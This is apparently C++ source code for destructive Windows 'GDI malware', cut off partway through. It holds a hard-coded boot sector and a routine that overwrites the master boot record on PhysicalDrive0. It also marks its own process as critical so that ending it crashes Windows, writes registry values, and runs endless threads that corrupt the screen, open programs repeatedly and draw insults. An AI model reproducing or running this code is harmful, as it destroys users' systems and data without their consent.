#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

const unsigned char MasterBootRecord[] = {
    0x31, 0xC0, 0xB9, 0x14, 0x00, 0x50, 0xE2, 0xFD, 0x89, 0xE5, 0xB0, 0x02, 0xCD, 0x10, 0xE4, 0x40,
    0x96, 0xFC, 0xB8, 0x00, 0xB8, 0x8E, 0xD8, 0x8E, 0xC0, 0xE8, 0xF0, 0x00, 0x31, 0xC0, 0x89, 0x46,
    0x04, 0xB1, 0x0F, 0xE8, 0x38, 0x01, 0x8B, 0x7E, 0x04, 0xB8, 0x61, 0x00, 0xF7, 0xE6, 0x83, 0xC0,
    0x17, 0x96, 0x80, 0xE4, 0x03, 0x80, 0xC4, 0x31, 0x88, 0x63, 0x08, 0xB8, 0x08, 0x00, 0x83, 0xFF,
    0x05, 0x72, 0x09, 0xB0, 0x06, 0x83, 0xFF, 0x0D, 0x72, 0x02, 0xB0, 0x04, 0x89, 0x46, 0x06, 0x83,
    0xFF, 0x1F, 0x75, 0x03, 0xE9, 0x88, 0x00, 0xFE, 0x46, 0x04, 0x31, 0xFF, 0x8A, 0x43, 0x08, 0x57,
    0x88, 0x46, 0x02, 0xE8, 0xA6, 0x00, 0x8B, 0x4E, 0x06, 0xE8, 0xF2, 0x00, 0xE8, 0x15, 0x01, 0xC6,
    0x46, 0x02, 0x00, 0xE8, 0x96, 0x00, 0xE8, 0xE3, 0x00, 0x5F, 0x47, 0x3B, 0x7E, 0x04, 0x75, 0xDC,
    0xB4, 0x01, 0xCD, 0x16, 0x74, 0x06, 0xB4, 0x00, 0xCD, 0x16, 0xEB, 0xF4, 0x31, 0xFF, 0xB4, 0x00,
    0xCD, 0x16, 0x3C, 0x1B, 0x74, 0x6F, 0x3C, 0x31, 0x72, 0xF4, 0x3C, 0x35, 0x73, 0xF0, 0x50, 0x57,
    0x88, 0x46, 0x02, 0xE8, 0x66, 0x00, 0x8B, 0x4E, 0x06, 0xE8, 0xB2, 0x00, 0xE8, 0xD5, 0x00, 0xC6,
    0x46, 0x02, 0x00, 0xE8, 0x56, 0x00, 0xE8, 0xA3, 0x00, 0x5F, 0x58, 0x3A, 0x43, 0x08, 0x75, 0x09,
    0x47, 0x3B, 0x7E, 0x04, 0x75, 0xC8, 0xE9, 0x58, 0xFF, 0xB9, 0xF9, 0x6E, 0xE8, 0xA2, 0x00, 0xB1,
    0x1B, 0xE8, 0x8A, 0x00, 0xE8, 0xAD, 0x00, 0xB1, 0x1B, 0xE8, 0x82, 0x00, 0xE9, 0x3D, 0xFF, 0xB0,
    0x32, 0xB9, 0x0E, 0x00, 0x51, 0x50, 0x88, 0x46, 0x02, 0xE8, 0x20, 0x00, 0xB1, 0x02, 0xE8, 0x6D,
    0x00, 0xC6, 0x46, 0x02, 0x00, 0xE8, 0x14, 0x00, 0x58, 0x40, 0x3C, 0x35, 0x75, 0x02, 0xB0, 0x31,
    0x59, 0xE2, 0xE1, 0xEB, 0xC4, 0xB8, 0x02, 0x00, 0xCD, 0x10, 0xCD, 0x20, 0xBF, 0x66, 0x01, 0xBB,
    0x2F, 0x31, 0xB9, 0x39, 0x0B, 0xE8, 0x21, 0x00, 0xBF, 0x92, 0x01, 0xBB, 0x4F, 0x32, 0xB9, 0xFB,
    0x0E, 0xE8, 0x15, 0x00, 0xBF, 0x46, 0x08, 0xBB, 0x6F, 0x33, 0xB9, 0xCC, 0x12, 0xE8, 0x09, 0x00,
    0xBF, 0x72, 0x08, 0xBB, 0x3F, 0x34, 0xB9, 0x72, 0x16, 0xB0, 0x20, 0x3A, 0x7E, 0x02, 0x75, 0x05,
    0xE8, 0x2E, 0x00, 0xB0, 0xB0, 0xB9, 0x0A, 0x00, 0x51, 0x88, 0xDC, 0xB1, 0x14, 0xF3, 0xAB, 0x83,
    0xC7, 0x78, 0x59, 0xE2, 0xF3, 0x88, 0xF8, 0x89, 0x85, 0xF4, 0xFC, 0xC3, 0xB1, 0x01, 0xB5, 0x00,
    0x51, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x56, 0x00, 0x74, 0xF7, 0x89, 0x56, 0x00, 0x59, 0xE2, 0xF0,
    0xC3, 0xB0, 0xB6, 0xE6, 0x43, 0x88, 0xC8, 0xE6, 0x42, 0x88, 0xE8, 0xE6, 0x42, 0xE4, 0x61, 0x0C,
    0x03, 0xE6, 0x61, 0xC3, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xC3, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
    return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
    HKEY hKey;
    DWORD dwDisposition;
    LONG result;
    result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
    return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

DWORD WINAPI nosignal(LPVOID lpParam) { //credits to camellia-y7x, but i modified it
    HBRUSH hBrush = NULL;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        hBrush = CreateSolidBrush(RGB(0, 0, 255));
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, PATINVERT);
        DeleteObject(hBrush);
        hBrush = CreateSolidBrush(RGB(174, 174, 174));
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, (w / 2) - 162, (h / 2) - 50, 290, 100, hcdc, 0, 0, PATCOPY);
        DeleteObject(hBrush);
        LPCSTR text = "No signal!";
        SetTextColor(hcdc, 0);
        SetBkMode(hcdc, 0);
        HFONT hFont = CreateFontA(35, 15, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hcdc, hFont);
        TextOutA(hcdc, (w / 2) - 80, (h / 2) - 19, text, strlen(text));
        DeleteObject(hFont);
        for (int i = 0; i < 100; i++) {
            int x = ((w / 2) - 164);
            int y = ((h / 2) - 50) + i;
            StretchBlt(hcdc, x - 2 + (rand() % 5), y, 325, 1, hcdc, x - 2 + (rand() % 5), y, 325, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI shader1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h, t = y ^ y | x;
            int tx = x ^ y * y & x;
            int ty = x * y ^ y * x;
            data[i].rgb = tx & ty;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, desk);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI shader2(LPVOID lpParam) { //credits to WinMalware, but i modified it
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        if ((rand() % 2) == 0) RedrawWindow(0, 0, 0, 133);
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                if ((rand() % 2) == 0) {
                    rgbquad[index].rgbRed = 255;
                    rgbquad[index].rgbGreen = 255;
                    rgbquad[index].rgbBlue = 255;
                }
                else {
                    rgbquad[index].rgbRed = 0;
                    rgbquad[index].rgbGreen = 255;
                    rgbquad[index].rgbBlue = 0;
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI shader3(LPVOID lpParam) { //credits to WinMalware, but i modified it
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].r = 0;
            rgbScreen[i].g = x;
            rgbScreen[i].b = y;
        }
        BLENDFUNCTION blend = { 0, 0, 100, 0 };
        AlphaBlend(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, w, h, blend);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI darker(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
        DrawIcon(hdc, rand() % w, rand() % h, LoadCursor(0, IDC_HAND));
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI polygon(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (true) {
        HDC hdc = GetDC(0);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        POINT vertices[] = { { rand() % w, rand() % h }, { rand() % w, rand() % h }, { rand() % w, rand() % h } };
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI opener(LPVOID lpvd) {
    while (true) {
        ShellExecuteA(NULL, NULL, "calc", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "notepad", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "dxdiag", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "write", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "winver", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "mspaint", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
        ShellExecuteA(NULL, NULL, "mmc", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(rand() % 5000);
    }
    return 0x00;
}

DWORD WINAPI shader4(LPVOID lpParam) { //credits to WinMalware, but i modified it
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                RGBQUAD rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(i / 100.0f, 1.0f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI shader5(LPVOID lpParam) { //credits to WinMalware, but i modified it
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    INT verticalOffset = 0;
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            BYTE color = (x ^ (y + verticalOffset));
            rgbScreen[i].r = color / 2;
            rgbScreen[i].g = color / 2;
            rgbScreen[i].b = color;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        verticalOffset = (verticalOffset + 1) % w;
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI textout(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HFONT hfnt = CreateFontA(20 + (rand() % 30), 20 + (rand() % 30), 0, 0, FW_THIN, 1, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, hfnt);
        LPCSTR things[] = {
            "93h9j2xi5z", "N17Pro3426", "GDI malware",
            "fuck you!", "you are an idiot"
        };
        int thing = rand() % _countof(things);
        SetTextColor(hdc, RndRGB());
        TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
        DeleteObject(hfnt);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI woah(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(dcCopy, 1, 1, w - 20, h - 20, hdc, 0, 0, w, h, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}

DWORD WINAPI lines(LPVOID lpParam) {
    int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
    int incrementation = 10;
    int x = 10, y = 10;
    while (true) {
        HDC hdc = GetDC(0);
        x += incrementation * sx;
        y += incrementation * sy;
        SelectObject(hdc, CreatePen(0, 0, Hue(239)));
        LineTo(hdc, x, y);
        if (y >= GetSystemMetrics(1)) {
            sy = -1;
        }
        if (x >= GetSystemMetrics(0)) {
            sx = -1;
        }
        if (y == 0) {
            sy = 1;
        }
        if (x == 0) {
            sx = 1;
        }
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shell32(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HINSTANCE lib = LoadLibraryA("shell32.dll");
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(lib, MAKEINTRESOURCE(rand() % 2048)), (rand() % 10 + 1) * GetSystemMetrics(11), (rand() % 10 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader6(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = rand();
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

VOID WINAPI sound0() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 10] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(255 * (1 & t * (t >> 9 | t >> 13)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 12 | t >> 8) & 47 & t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(~t * (t ^ t >> 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
